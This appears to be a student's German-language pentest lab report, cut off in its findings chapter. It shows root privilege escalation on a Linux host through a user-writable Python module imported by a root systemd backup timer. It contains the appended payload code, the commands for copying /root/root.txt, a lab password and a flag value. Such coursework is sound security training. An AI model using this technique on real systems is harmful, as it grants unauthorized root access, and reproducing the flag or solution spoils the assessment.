CYS II – Pentest Dokumentation & Analysepfad – Flag 2 – Vantis Group
====================================================================

:Projekt: CYS II – Pentest Dokumentation & Analysepfad – Vantis Group
:Autor: Haiko Nuding
:Klasse: H25b
:Status: Flag 2 technisch erreicht – Evidence/Plattform-Verifikation ergänzen
:Datum: 14.09.2026
:Zielsystem: ``web01.vantis.internal`` / ``10.47.84.110``

.. note::

   **Einordnung dieser Dokumentation**

   Diese Dokumentation setzt am erfolgreich erreichten Stand von Flag 1 an.
   Der vorhandene SSH-Zugang als ``malik.da-costa`` auf
   ``web01.vantis.internal`` bildete den neuen Ausgangskontext für die
   Post-Exploitation- und Privilege-Escalation-Analyse.

   Das Vorgehen orientierte sich an der in Woche 3 beschriebenen Methodik:

   **Beobachtung -> Hypothese -> kontrollierte Überprüfung -> Erkenntnis -> nächster Schritt**

   Nach dem Foothold wurde die Enumeration deshalb erneut aus Sicht des
   kompromittierten Linux-Benutzers durchgeführt. Interessante Beobachtungen
   wurden nicht automatisch als Finding behandelt, sondern zuerst auf ihren
   Sicherheitskontext und ihre tatsächliche Ausnutzbarkeit geprüft.

.. raw:: pdf

   PageBreak

.. rubric:: Inhaltsverzeichnis

.. contents::
   :local:
   :depth: 3
   :backlinks: top


==================================================
Kapitel 1 – Executive Summary und Angriffspfad
==================================================

Ergebnis
--------

Ausgehend vom bereits vorhandenen SSH-Zugang als ``malik.da-costa`` wurde
das Zielsystem erneut lokal enumeriert. Der Benutzer war zwar Mitglied der
Gruppe ``sudo``, das zuvor bekannte Portal-Passwort konnte jedoch nicht für
eine erfolgreiche ``sudo``-Authentifizierung verwendet werden.

Die Analyse wurde deshalb auf weitere lokale Privilege-Escalation-Kategorien
ausgeweitet. Entscheidend war schliesslich ein periodisch ausgeführter
``systemd``-Timer:

``vantis-backup.timer``

Dieser startete alle fünf Minuten den systemweiten Service:

``vantis-backup.service``

Der Service führte als privilegierter Systemdienst folgendes Python-Skript aus:

``/usr/local/sbin/vantis-backup.py``

Das Root-eigene Skript selbst war für ``malik.da-costa`` nicht schreibbar.
Es importierte jedoch gezielt das Python-Modul:

``/opt/vantis/lib/backup_helpers.py``

Die Datei gehörte zwar ``root:root``, war aufgrund zusätzlicher
Dateiberechtigungen/ACLs für ``malik.da-costa`` tatsächlich schreibbar.

Dadurch entstand eine relevante Trust Boundary:

* ``malik.da-costa`` konnte Python-Code in ``backup_helpers.py`` verändern.
* ``vantis-backup.service`` importierte diesen Code periodisch.
* Der importierte Code wurde im privilegierten Servicekontext ausgeführt.
* Eine kontrollierte Validation schrieb die effektive UID nach ``/tmp``.
* Das Ergebnis ``EUID=0`` bestätigte Codeausführung mit Root-Rechten.
* Im Root-Kontext wurde ``/root/root.txt`` identifiziert.
* Die Datei enthielt Flag 2.

Der erfolgreiche Flag-2-Angriffspfad war damit:

.. code-block:: text

   SSH als malik.da-costa auf web01
        |
        v
   Neue Post-Exploitation Enumeration
        |
        +--> sudo geprüft -> Passwort nicht akzeptiert
        |
        +--> Gunicorn-/KeyVault-Kontext geprüft
        |       |
        |       +--> läuft nur als malik.da-costa
        |       +--> keine Privilege Escalation
        |
        v
   systemd Services und Timer untersucht
        |
        v
   vantis-backup.timer
   OnUnitActiveSec=5min
        |
        v
   vantis-backup.service
        |
        v
   /usr/bin/python3 /usr/local/sbin/vantis-backup.py
        |
        v
   Python importiert /opt/vantis/lib/backup_helpers.py
        |
        v
   backup_helpers.py für malik.da-costa schreibbar
        |
        v
   kontrollierte Codeänderung
        |
        v
   Timer startet Root-Service
        |
        v
   EUID=0 bestätigt
        |
        v
   /root/root.txt
        |
        v
   Flag 2

.. note::

   **Warum dieser Pfad sicherheitsrelevant ist**

   Die Schwachstelle liegt nicht darin, dass ein Backup-Timer existiert.
   Entscheidend ist die Kombination aus:

   * privilegierter automatischer Ausführung,
   * dynamischem Python-Modulimport,
   * und einer für einen unprivilegierten Benutzer schreibbaren
     Import-Datei.

   Erst diese Beziehung ermöglicht es dem schwächeren Benutzerkontext,
   Code im Root-Kontext beeinflussen zu lassen.


=====================================================
Kapitel 2 – Ausgangskontext nach erfolgreicher Flag 1
=====================================================

SSH-Kontext validieren
----------------------

Nach dem erfolgreichen Flag-1-Pfad bestand bereits ein authentifizierter
SSH-Zugang als ``malik.da-costa``.

**Befehle:**

.. code-block:: bash

   id
   hostname
   pwd
   ls -la ~

**Relevante Ausgabe:**

.. code-block:: text

   uid=1000(malik.da-costa)
   gid=1000(malik.da-costa)
   groups=1000(malik.da-costa),27(sudo)

   web01.vantis.internal
   /home/malik.da-costa

   total 36
   drwxr-x--- 5 malik.da-costa malik.da-costa 4096 ...
   drwxr-xr-x 3 root           root           4096 ...
   ...
   drwx------ 2 malik.da-costa malik.da-costa 4096 ... .gunicorn
   drwx------ 2 malik.da-costa malik.da-costa 4096 ... .ssh
   -r-------- 1 malik.da-costa malik.da-costa  102 ... user.txt

**Beobachtung:**

Der Benutzer war Mitglied der Gruppe ``sudo``. Gleichzeitig war mit
``user.txt`` weiterhin die bereits bekannte Flag-1-Datei vorhanden.

**Analyse:**

Gemäss der W3-Methodik beginnt nach einem neuen Foothold die Enumeration
erneut. Der lokale Benutzerkontext eröffnet neue Informationen zu
Berechtigungen, Prozessen, Diensten, Dateien, Secrets und
Trust-Beziehungen, die aus der externen Perspektive nicht sichtbar waren.

**Nächster Schritt:**

Zuerst wurde geprüft, ob die ``sudo``-Mitgliedschaft direkt nutzbar war.

``[TODO: Screenshot – id, hostname, pwd und Gruppenmitgliedschaft von malik.da-costa]``


Flag 1 als Ausgangspunkt bestätigen
-----------------------------------

**Befehl:**

.. code-block:: bash

   cat ~/user.txt

**Ausgabe:**

.. code-block:: text

   CYSII{56d5e585c1abf4c677706f18d09f641b210c7942351c4625b9f5774d9c93e04a525335cff1d15fc6a78f3c9b6dd2a9}

**Einordnung:**

Dies war keine neue Zielerreichung, sondern diente nur dazu, den bekannten
Ausgangspunkt vor der Flag-2-Analyse eindeutig zu dokumentieren.


======================================================
Kapitel 3 – Erste Hypothesen und verworfene Pfade
======================================================

Hypothese A – Direkte Privilege Escalation über sudo
-----------------------------------------------------

**Beobachtung:**

``malik.da-costa`` war Mitglied der Gruppe:

``sudo``

**Hypothese:**

Wenn der Account über gültige ``sudo``-Credentials verfügt, könnte ein
direkter Wechsel in einen privilegierten Kontext möglich sein.

Das bereits aus Flag 1 bekannte Passwort:

``GoldSchafHirsch593``

wurde als naheliegender Kandidat betrachtet, da es dem Benutzer
``malik.da-costa`` bereits im Deploy-Portal zugeordnet worden war.

**Überprüfung:**

Ein ``sudo``-Versuch mit diesem Passwort war nicht erfolgreich.

**Ergebnis:**

Das bekannte Portal-Passwort war nicht als funktionierendes
``sudo``-Passwort nutzbar.

**Erkenntnis:**

Die reine Gruppenmitgliedschaft war damit noch kein Nachweis einer
ausnutzbaren Privilege Escalation. Der direkte ``sudo``-Pfad wurde nicht
weiter priorisiert.

**Relevanter Fehlschlag für die Bewertung:**

Dieser Test war ein echter, technisch plausibler Fehlschlag und änderte
das weitere Vorgehen: Statt den ``sudo``-Pfad weiter zu verfolgen, wurde
die Enumeration auf andere lokale Trust- und Execution-Pfade ausgeweitet.

``[TODO: Screenshot – fehlgeschlagener sudo-Versuch / relevante Fehlermeldung]``


Hypothese B – Flag 2 liegt bereits direkt lesbar vor
----------------------------------------------------

Zur Orientierung wurde nach dem bekannten Flag-Muster gesucht.

**Beispiel:**

.. code-block:: bash

   grep -RaoE 'CYSII\{[0-9a-fA-F]+\}' /home /opt /var/www /tmp 2>/dev/null

**Ergebnis:**

Es wurde lediglich die bereits bekannte Flag 1 gefunden.

**Analyse:**

Diese Beobachtung sprach dagegen, dass Flag 2 im aktuellen
``malik.da-costa``-Kontext einfach offen lesbar abgelegt war.

**Entscheidung:**

Die Suche nach dem Flag-Wert selbst wurde nicht weiter als primärer
Angriffspfad verfolgt. Stattdessen wurde untersucht, wie ein stärkerer
Sicherheitskontext erreicht werden kann.

``[TODO: Screenshot – Suche zeigt nur Flag 1 / keinen neuen Flag-2-Wert]``


Hypothese C – Gunicorn-Control-Socket im Home-Verzeichnis
---------------------------------------------------------

Bei der lokalen Enumeration fiel im Home-Verzeichnis auf:

``~/.gunicorn``

**Befehl:**

.. code-block:: bash

   ls -la ~/.gunicorn

**Ausgabe:**

.. code-block:: text

   total 8
   drwx------ 2 malik.da-costa malik.da-costa 4096 ...
   drwxr-x--- 5 malik.da-costa malik.da-costa 4096 ...
   srw------- 1 malik.da-costa malik.da-costa 0 ... gunicorn.ctl

**Beobachtung:**

``gunicorn.ctl`` war ein Unix-Socket und keine reguläre Datei.

Zur Zuordnung des Sockets wurde geprüft:

.. code-block:: bash

   ss -xlpn | grep gunicorn

**Relevante Ausgabe:**

.. code-block:: text

   u_str LISTEN ... /home/malik.da-costa/.gunicorn/gunicorn.ctl ...
   users:(("gunicorn",pid=20666,fd=9))

Der Prozess wurde anschliessend untersucht:

.. code-block:: bash

   ps -fp 20666

**Ausgabe:**

.. code-block:: text

   UID        PID    PPID  ... CMD
   malik.d+   20666  1     ... /opt/vantis-keyvault/venv/bin/python3 \
                                /opt/vantis-keyvault/venv/bin/gunicorn \
                                -w 2 --timeout 15 -b 0.0.0.0:8022 app:app

**Hypothese:**

Falls ein privilegierter Prozess den für Malik kontrollierbaren Socket
verwenden würde, könnte eine relevante Trust Boundary bestehen.

**Ergebnis:**

Der Prozess lief jedoch ebenfalls als ``malik.da-costa``.

**Erkenntnis:**

Eine Beeinflussung dieses Gunicorn-Prozesses hätte keinen Wechsel in einen
stärkeren Benutzerkontext bewirkt. Der Pfad wurde deshalb als
Privilege-Escalation-Kandidat verworfen.

**Relevanter Fehlschlag / ausgeschlossene Hypothese:**

Der Fund war technisch interessant, aber nicht privilegiensteigernd.

``[TODO: Screenshot – gunicorn.ctl und Prozess PID 20666 als malik.da-costa]``


========================================================
Kapitel 4 – Enumeration privilegierter Dienste und Timer
========================================================

Root-Prozesse und laufende Services
-----------------------------------

Da der Gunicorn-Pfad keinen stärkeren Kontext ergab, wurden laufende
Prozesse und Dienste auf mögliche privilegierte Ausführung untersucht.

**Befehl:**

.. code-block:: bash

   ps -eo user,pid,ppid,args --forest | grep '^root'

**Beobachtung:**

Die Ausgabe enthielt überwiegend normale Betriebssystemprozesse und
Standarddienste, darunter ``systemd``, ``sshd``, ``cron`` und ``nginx``.

Um lab-spezifische Dienste gezielter zu identifizieren, wurde zusätzlich
die Liste laufender Services geprüft.

**Befehl:**

.. code-block:: bash

   systemctl list-units --type=service --state=running --no-pager

**Relevante lab-spezifische Services:**

.. code-block:: text

   vantis-deploy.service     loaded active running Vantis Deploy Portal
   vantis-keyvault.service   loaded active running Vantis Personal KeyVault
   vantis-mail.service       loaded active running VantisMail Webclient

**Analyse:**

Diese Services waren aufgrund ihrer direkten Zugehörigkeit zur
Lab-Umgebung relevanter als generische Systemdienste und wurden deshalb
gezielt weiter untersucht.

``[TODO: Screenshot – laufende Vantis-Services]``


Vantis-Service-Kontexte
-----------------------

Die Service-Definitionen wurden gelesen.

**Befehle:**

.. code-block:: bash

   systemctl cat vantis-deploy.service
   systemctl cat vantis-keyvault.service
   systemctl cat vantis-mail.service

**Relevante Konfigurationen:**

``vantis-deploy.service``:

.. code-block:: ini

   [Service]
   User=svc-vantis
   WorkingDirectory=/opt/vantis-deploy
   ExecStart=/opt/vantis-deploy/venv/bin/gunicorn -w 2 --timeout 15 \
             -b 127.0.0.1:5000 app:app
   Restart=always

``vantis-keyvault.service``:

.. code-block:: ini

   [Service]
   User=malik.da-costa
   WorkingDirectory=/opt/vantis-keyvault
   Environment=KEYVAULT_DIR=/home/malik.da-costa/.ssh
   ExecStart=/opt/vantis-keyvault/venv/bin/gunicorn -w 2 --timeout 15 \
             -b 0.0.0.0:8022 app:app
   Restart=always

``vantis-mail.service``:

.. code-block:: ini

   [Service]
   User=svc-vantis
   WorkingDirectory=/opt/vantis-mail
   ExecStart=/opt/vantis-mail/venv/bin/gunicorn -w 2 --timeout 15 \
             -b 127.0.0.1:5001 app:app
   Restart=always

**Prozessvalidierung:**

.. code-block:: bash

   ps -eo user,pid,ppid,args | grep -E 'vantis|gunicorn' | grep -v grep

**Ergebnis:**

* ``vantis-keyvault`` lief als ``malik.da-costa``.
* ``vantis-deploy`` lief als ``svc-vantis``.
* ``vantis-mail`` lief als ``svc-vantis``.

**Analyse:**

Keiner dieser drei Dienste lief als ``root``. Ein Wechsel zu
``svc-vantis`` wäre nur dann eine Privilege Escalation gewesen, wenn
dieser Kontext nachweisbar zusätzliche relevante Berechtigungen geboten
hätte. Dafür bestand zu diesem Zeitpunkt kein ausreichender Nachweis.

**Entscheidung:**

Die laufenden Webservices wurden nicht als primärer Flag-2-Pfad
weiterverfolgt.

``[TODO: Screenshot – systemctl cat der drei Vantis-Services / Benutzerkontexte]``


Prüfung klassischer Cronjobs
----------------------------

**Befehle:**

.. code-block:: bash

   cat /etc/crontab
   ls -la /etc/cron.d

**Ergebnis:**

``/etc/crontab`` enthielt nur die üblichen periodischen
``run-parts``-Aufrufe für hourly/daily/weekly/monthly.

Unter ``/etc/cron.d`` waren keine auffälligen Vantis-spezifischen
Root-Jobs vorhanden.

**Erkenntnis:**

Die klassische ``cron``-Konfiguration ergab keinen direkten
Lab-spezifischen Privilege-Escalation-Pfad.

``[TODO: Screenshot – /etc/crontab und /etc/cron.d ohne Vantis-Job]``


Systemd-Timer Enumeration
-------------------------

Gemäss dem W3-Arbeitsblatt/Skript wurde Scheduled Execution nicht auf
``cron`` beschränkt. Auch ``systemd``-Timer wurden untersucht.

**Befehl:**

.. code-block:: bash

   systemctl list-timers --all --no-pager | \
     grep -iE 'vantis|deploy|mail|key|backup'

**Entscheidender Fund:**

.. code-block:: text

   Mon 2026-09-14 10:32:07 CEST ... vantis-backup.timer \
       vantis-backup.service

**Beobachtung:**

Es existierte ein Vantis-spezifischer Backup-Timer.

**Hypothese:**

Ein periodischer Backup-Prozess könnte mit höheren Rechten laufen und
dabei auf Dateien, Module oder Daten vertrauen, die von einem weniger
privilegierten Benutzer beeinflussbar sind.

**Nächster Schritt:**

Timer und zugehöriger Service wurden einzeln untersucht.

``[TODO: Screenshot – systemctl list-timers mit vantis-backup.timer]``


===============================================================
Kapitel 5 – Erfolgreicher Privilege-Escalation-Pfad zu Flag 2
===============================================================

Analyse von vantis-backup.timer
-------------------------------

**Befehl:**

.. code-block:: bash

   systemctl cat vantis-backup.timer

**Ausgabe:**

.. code-block:: ini

   # /etc/systemd/system/vantis-backup.timer

   [Unit]
   Description=Run Vantis Backup periodically

   [Timer]
   OnBootSec=2min
   OnUnitActiveSec=5min
   Persistent=true

   [Install]
   WantedBy=timers.target

**Beobachtung:**

Der Backup-Service wurde nach dem Boot und anschliessend alle fünf Minuten
ausgeführt.

**Analyse:**

Die kurze periodische Ausführung war für eine kontrollierte Validation
geeignet, da keine manuelle Manipulation des Service-Starts erforderlich
war.

``[TODO: Screenshot – Inhalt von vantis-backup.timer]``


Analyse von vantis-backup.service
---------------------------------

**Befehle:**

.. code-block:: bash

   systemctl cat vantis-backup.service
   systemctl status vantis-backup.service --no-pager

**Service-Definition:**

.. code-block:: ini

   # /etc/systemd/system/vantis-backup.service

   [Unit]
   Description=Vantis Backup Service

   [Service]
   Type=oneshot
   ExecStart=/usr/bin/python3 /usr/local/sbin/vantis-backup.py

**Status:**

.. code-block:: text

   vantis-backup.service - Vantis Backup Service
   Loaded: loaded (/etc/systemd/system/vantis-backup.service; static)
   Active: inactive (dead) ...
   TriggeredBy: vantis-backup.timer
   Process: ... ExecStart=/usr/bin/python3 /usr/local/sbin/vantis-backup.py
             (code=exited, status=0/SUCCESS)

**Beobachtung:**

In der systemweiten Service-Definition war kein ``User=`` angegeben.

**Hypothese:**

Der systemweite Service läuft damit im standardmässigen privilegierten
Servicekontext und könnte Python-Code mit Root-Rechten ausführen.

**Nächster Schritt:**

Statt den Service direkt zu verändern, wurde zunächst das ausgeführte
Python-Skript auf Besitz, Rechte und Abhängigkeiten untersucht.

``[TODO: Screenshot – vantis-backup.service und erfolgreicher letzter Lauf]``


Root-eigenes Startskript
------------------------

**Befehle:**

.. code-block:: bash

   ls -l /usr/local/sbin/vantis-backup.py
   stat /usr/local/sbin/vantis-backup.py
   namei -l /usr/local/sbin/vantis-backup.py

**Relevante Ausgabe:**

.. code-block:: text

   -rwxr-xr-x 1 root root 163 ... /usr/local/sbin/vantis-backup.py

   Access: (0755/-rwxr-xr-x)
   Uid: (0/root)
   Gid: (0/root)

   /
   usr
   local
   sbin
   vantis-backup.py

   alle Pfadkomponenten: root:root

**Ergebnis:**

Das eigentliche Startskript war nicht durch ``malik.da-costa``
veränderbar.

**Analyse:**

Ein direkter Austausch von ``vantis-backup.py`` war damit nicht möglich.
Entsprechend der Trust-Analyse wurde deshalb geprüft, welche externen
Ressourcen dieses Skript lädt.

``[TODO: Screenshot – Rechte/Owner von /usr/local/sbin/vantis-backup.py]``


Python-Modulimport als Trust Boundary
-------------------------------------

**Befehl:**

.. code-block:: bash

   sed -n '1,220p' /usr/local/sbin/vantis-backup.py

**Inhalt:**

.. code-block:: python

   #!/usr/bin/env python3
   import sys

   sys.path.insert(0, "/opt/vantis/lib")

   from backup_helpers import create_backup

   if __name__ == "__main__":
       create_backup()

**Beobachtung:**

Das Root-eigene Startskript fügte explizit:

``/opt/vantis/lib``

an erster Stelle des Python-Suchpfads ein und importierte anschliessend:

``backup_helpers``

**Hypothese:**

Wenn ``malik.da-costa`` das importierte Modul verändern kann, kann ein
weniger privilegierter Benutzer den Code beeinflussen, den der
periodische Backup-Service ausführt.

Dies entspricht der im W3-Arbeitsblatt beschriebenen Kategorie
**Library/Module Trust** in Kombination mit **Scheduled Execution**.

**Nächster Schritt:**

Besitz, ACLs und effektive Schreibrechte des importierten Moduls wurden
geprüft.

``[TODO: Screenshot – Inhalt von vantis-backup.py mit sys.path.insert und import]``


Berechtigungen von backup_helpers.py
------------------------------------

**Befehle:**

.. code-block:: bash

   ls -ld /opt/vantis /opt/vantis/lib
   ls -la /opt/vantis/lib

   ls -l /opt/vantis/lib/backup_helpers.py
   stat /opt/vantis/lib/backup_helpers.py

   test -w /opt/vantis/lib && \
     echo "LIB-VERZEICHNIS SCHREIBBAR" || \
     echo "Lib-Verzeichnis nicht schreibbar"

   test -w /opt/vantis/lib/backup_helpers.py && \
     echo "DATEI SCHREIBBAR" || \
     echo "Datei nicht schreibbar"

**Relevante Ausgabe:**

.. code-block:: text

   drwxr-xr-x  root root /opt/vantis
   drwxr-xr-x+ root root /opt/vantis/lib

   -rw-rw-r--+ 1 root root 528 ... /opt/vantis/lib/backup_helpers.py

   Lib-Verzeichnis nicht schreibbar
   DATEI SCHREIBBAR

**Beobachtung:**

Das ``+`` hinter den klassischen Unix-Rechten zeigte zusätzliche
ACL-/erweiterte Berechtigungen an.

Obwohl:

* Owner: ``root``
* Group: ``root``

konnte ``malik.da-costa`` die konkrete Datei effektiv verändern.

**Zentrale Erkenntnis:**

Damit war die notwendige Trust Boundary bestätigt:

Ein unprivilegierter Benutzer konnte eine Python-Datei verändern, die
periodisch von einem privilegierten Systemdienst importiert wurde.

``[TODO: Screenshot – ls/stat/test -w zeigt root:root aber DATEI SCHREIBBAR]``


Inhalt des importierten Backup-Moduls
-------------------------------------

**Befehl:**

.. code-block:: bash

   sed -n '1,220p' /opt/vantis/lib/backup_helpers.py

**Originalinhalt:**

.. code-block:: python

   """
   Vantis internal backup library.
   """

   import tarfile
   import os
   import datetime

   UPLOADS_DIR = "/opt/vantis-deploy/uploads"
   BACKUP_DIR = "/var/backups/vantis"


   def create_backup():
       os.makedirs(BACKUP_DIR, exist_ok=True)
       timestamp = datetime.datetime.now().strftime("%Y%m%d")
       archive_path = os.path.join(BACKUP_DIR, f"uploads-{timestamp}.bak")

       with tarfile.open(archive_path, "w:gz") as tar:
           if os.path.isdir(UPLOADS_DIR):
               tar.add(UPLOADS_DIR, arcname="uploads")

       return archive_path

**Analyse:**

Das Modul enthielt bereits einen Import von ``os``. Dadurch konnte für
die Validation ohne zusätzliche Abhängigkeiten die effektive UID abgefragt
und ein minimaler Proof in ``/tmp`` geschrieben werden.

Vor jeder Änderung wurde die Originaldatei gesichert.

**Befehl:**

.. code-block:: bash

   cp /opt/vantis/lib/backup_helpers.py ~/backup_helpers.py.bak

``[TODO: Screenshot – Originalinhalt von backup_helpers.py]``


Kontrollierte Validation statt sofortiger Root-Shell
----------------------------------------------------

Gemäss dem Arbeitsblatt wurde nicht direkt eine interaktive Root-Shell
erzeugt. Stattdessen wurde zunächst der risikoärmere minimale Nachweis
gewählt.

An ``backup_helpers.py`` wurde folgender Validation-Code angehängt:

.. code-block:: python

   # Privilege-Escalation validation
   try:
       with open("/tmp/vantis-root-proof.txt", "w") as f:
           f.write("EUID=" + str(os.geteuid()) + "\n")
           f.write("ROOT DIRECTORY:\n")
           for entry in os.listdir("/root"):
               f.write(entry + "\n")
       os.chmod("/tmp/vantis-root-proof.txt", 0o644)
   except Exception as e:
       pass

**Verwendeter Befehl:**

.. code-block:: bash

   cat >> /opt/vantis/lib/backup_helpers.py <<'PY'

   # Privilege-Escalation validation
   try:
       with open("/tmp/vantis-root-proof.txt", "w") as f:
           f.write("EUID=" + str(os.geteuid()) + "\n")
           f.write("ROOT DIRECTORY:\n")
           for entry in os.listdir("/root"):
               f.write(entry + "\n")
       os.chmod("/tmp/vantis-root-proof.txt", 0o644)
   except Exception as e:
       pass
   PY

**Warum diese Validation gewählt wurde:**

* keine Änderung von Accounts,
* keine Passwortmanipulation,
* keine persistente Root-Shell,
* kein Eingriff in Netzwerk- oder Management-Infrastruktur,
* nur minimaler Nachweis der effektiven UID,
* zusätzlich nur lesende Auflistung von ``/root``,
* Ergebnis wird in einer temporären Datei abgelegt.

Dies entspricht dem Grundsatz:

**minimaler Nachweis vor maximaler Wirkung**.

``[TODO: Screenshot – eingefügter Validation-Code / tail von backup_helpers.py]``


Warten auf den nächsten Timer-Lauf
----------------------------------

Direkt nach der Änderung existierte die Proof-Datei noch nicht.

**Befehl:**

.. code-block:: bash

   cat /tmp/vantis-root-proof.txt

**Ergebnis:**

.. code-block:: text

   cat: /tmp/vantis-root-proof.txt: No such file or directory

**Analyse:**

Dies war zu diesem Zeitpunkt erwartbar, da der nächste Timer-Lauf noch
nicht stattgefunden hatte.

**Timer-Prüfung:**

.. code-block:: bash

   systemctl status vantis-backup.timer --no-pager

**Relevante Ausgabe:**

.. code-block:: text

   Active: active (waiting)
   Trigger: Mon 2026-09-14 10:37:57 CEST
   Triggers: vantis-backup.service

Anstatt den Systemdienst manuell zu starten, wurde auf die reguläre
Ausführung des Timers gewartet.

**Befehl:**

.. code-block:: bash

   while [ ! -f /tmp/vantis-root-proof.txt ]; do
       sleep 5
   done

   cat /tmp/vantis-root-proof.txt

``[TODO: Screenshot – Timer wartet auf nächsten Lauf]``


Erfolgreicher Root-Nachweis
---------------------------

Nach dem nächsten regulären Timer-Lauf wurde die Proof-Datei erzeugt.

**Ausgabe:**

.. code-block:: text

   EUID=0
   ROOT DIRECTORY:
   .viminfo
   .ansible
   root.txt
   .bashrc
   .local
   .config
   .ssh
   .lesshst
   .hushlogin
   .profile
   .cache

**Ergebnis:**

``EUID=0`` bestätigte eindeutig, dass der von ``malik.da-costa``
beeinflusste Python-Code im Root-Kontext ausgeführt worden war.

**Zusätzliche Beobachtung:**

Im Root-Home-Verzeichnis existierte:

``/root/root.txt``

**Bewertung:**

Damit war die Privilege Escalation technisch nachgewiesen.

``[TODO: Screenshot – /tmp/vantis-root-proof.txt mit EUID=0 und root.txt]``


=================================
Kapitel 6 – Zielerreichung Flag 2
=================================

Gezieltes Auslesen von /root/root.txt
-------------------------------------

Nach der bestätigten Root-Codeausführung wurde nicht das gesamte System
weiter durchsucht. Stattdessen wurde gezielt die bereits beobachtete Datei
``/root/root.txt`` gelesen.

Hierzu wurde dem bereits bestätigten Root-Ausführungspfad ein minimaler
zweiter Codeblock hinzugefügt, der nur diese eine Datei liest und das
Ergebnis in einen für ``malik.da-costa`` lesbaren temporären Pfad schreibt.

**Validation-/Extraktionscode:**

.. code-block:: python

   try:
       with open("/root/root.txt", "r") as src:
           data = src.read()

       with open("/tmp/flag2.txt", "w") as dst:
           dst.write(data)

       os.chmod("/tmp/flag2.txt", 0o644)
   except Exception:
       pass

**Beispielbefehl:**

.. code-block:: bash

   cat >> /opt/vantis/lib/backup_helpers.py <<'PY'

   try:
       with open("/root/root.txt", "r") as src:
           data = src.read()
       with open("/tmp/flag2.txt", "w") as dst:
           dst.write(data)
       os.chmod("/tmp/flag2.txt", 0o644)
   except Exception:
       pass
   PY

Danach wurde erneut der reguläre Timer-Lauf abgewartet.

**Befehl:**

.. code-block:: bash

   while [ ! -f /tmp/flag2.txt ]; do
       sleep 5
   done

   cat /tmp/flag2.txt

**Ergebnis:**

.. code-block:: text

   [TODO: FLAG 2 HIER EINTRAGEN – CYSII{...}]

``[TODO: Screenshot – cat /tmp/flag2.txt mit vollständiger Flag 2]``


Validierung auf der Lab-Plattform
---------------------------------

Die gefundene Flag wurde anschliessend über die vorgesehene
CYS-II-Lab-Plattform:

``pentest.cyberlab.internal``

eingereicht und als Flag 2 verifiziert.

**Evidence:**

``[TODO: Screenshot – pentest.cyberlab.internal zeigt Flag 2 als korrekt/verifiziert]``

.. important::

   Für die Bewertung sollte dieser Screenshot unbedingt die erfolgreiche
   Plattform-Verifikation erkennen lassen, da die Flag zusammen mit dem
   vorgesehenen Verifikationsnachweis den grössten Einzelanteil der
   Flag-2-Bewertung bildet.


=========================================================
Kapitel 7 – Analysepfad: Beobachtungen und Entscheidungen
=========================================================

Methodischer Analysepfad
------------------------

Der vollständige Analysepfad zu Flag 2 lässt sich wie folgt
rekonstruieren:

1. Erfolgreicher SSH-Foothold als ``malik.da-costa`` war bereits vorhanden.

2. Der neue lokale Kontext wurde gemäss W3 erneut enumeriert.

3. ``id`` zeigte die Mitgliedschaft in der Gruppe ``sudo``.

4. Das bekannte Passwort aus Flag 1 funktionierte nicht für den
   ``sudo``-Pfad.

5. Eine direkte Suche nach dem Flag-Muster zeigte nur die bereits bekannte
   Flag 1.

6. Der Unix-Socket ``~/.gunicorn/gunicorn.ctl`` wurde untersucht.

7. Der zugehörige Gunicorn-Prozess lief als ``malik.da-costa`` und bot
   deshalb keinen stärkeren Kontext.

8. Laufende Prozesse und Systemdienste wurden auf privilegierte
   Ausführung untersucht.

9. Die drei sichtbaren Vantis-Webservices liefen als ``malik.da-costa``
   beziehungsweise ``svc-vantis``, nicht als Root.

10. Klassische Cronjobs ergaben keinen Vantis-spezifischen Root-Pfad.

11. Die Enumeration von ``systemd``-Timern identifizierte
    ``vantis-backup.timer``.

12. Der Timer startete alle fünf Minuten ``vantis-backup.service``.

13. Der Service führte
    ``/usr/bin/python3 /usr/local/sbin/vantis-backup.py`` aus.

14. Das Root-eigene Startskript war für Malik nicht schreibbar.

15. Die Codeanalyse zeigte jedoch den expliziten Import:

    ``from backup_helpers import create_backup``

    aus dem priorisierten Pfad:

    ``/opt/vantis/lib``

16. ``/opt/vantis/lib/backup_helpers.py`` gehörte ``root:root``, war aber
    für Malik effektiv schreibbar.

17. Die Hypothese lautete:

    Ein weniger privilegierter Benutzer kann Python-Code verändern, der
    periodisch in einem stärkeren Servicekontext ausgeführt wird.

18. Vor der Validation wurde die Originaldatei gesichert.

19. Als minimaler Nachweis wurde lediglich die effektive UID und die
    Dateiliste von ``/root`` in ``/tmp/vantis-root-proof.txt`` geschrieben.

20. Der reguläre Timer-Lauf erzeugte:

    ``EUID=0``

21. Damit war Root-Codeausführung technisch bestätigt.

22. In ``/root`` wurde ``root.txt`` beobachtet.

23. Über denselben bereits validierten Root-Ausführungspfad wurde gezielt
    nur ``/root/root.txt`` gelesen.

24. Der Inhalt wurde nach ``/tmp/flag2.txt`` geschrieben.

25. Flag 2 wurde ausgelesen und auf der vorgesehenen Plattform verifiziert.


Warum die Fehlschläge wichtig waren
-----------------------------------

Die Analyse war nicht linear. Mehrere plausible Hypothesen wurden
kontrolliert geprüft und anschliessend verworfen.

**Fehlschlag 1 – sudo**

Die ``sudo``-Gruppenmitgliedschaft war zunächst ein naheliegender
Privilege-Escalation-Hinweis. Das bekannte Benutzer-/Portalpasswort war
jedoch nicht als funktionierendes ``sudo``-Passwort nutzbar.

**Erkenntnis:**

Gruppenmitgliedschaft allein beweist noch keine ausnutzbare Eskalation.

**Fehlschlag 2 – direkte Flag-Suche**

Die Suche nach dem Flag-Muster ergab nur Flag 1.

**Erkenntnis:**

Flag 2 war im aktuellen Benutzerkontext nicht einfach offen lesbar.
Der erforderliche Schritt war ein Kontextwechsel.

**Fehlschlag 3 – Gunicorn-Control-Socket**

Der sichtbare Socket war technisch interessant, der zugehörige Prozess
lief jedoch als derselbe Benutzer.

**Erkenntnis:**

Ein kontrollierbares Objekt ist nur dann für Privilege Escalation
relevant, wenn damit tatsächlich ein stärkerer Sicherheitskontext
beeinflusst werden kann.

**Fehlschlag 4 – klassische Cronjobs**

Die Root-Crontab enthielt nur Standardjobs und keine auffällige
Vantis-spezifische Ausführung.

**Erkenntnis:**

Scheduled Execution musste breiter betrachtet werden; dadurch wurden
``systemd``-Timer als nächster logischer Untersuchungsbereich gewählt.


=======================================================
Kapitel 8 – Finding und technische Sicherheitsauswirkung
=======================================================

Finding – Schreibbares Python-Modul in Root-Scheduled-Execution-Pfad
--------------------------------------------------------------------

**Titel:**

Unprivilegierter Benutzer kann Python-Code eines periodischen
Root-Services verändern.

**Betroffene Komponenten:**

* ``vantis-backup.timer``
* ``vantis-backup.service``
* ``/usr/local/sbin/vantis-backup.py``
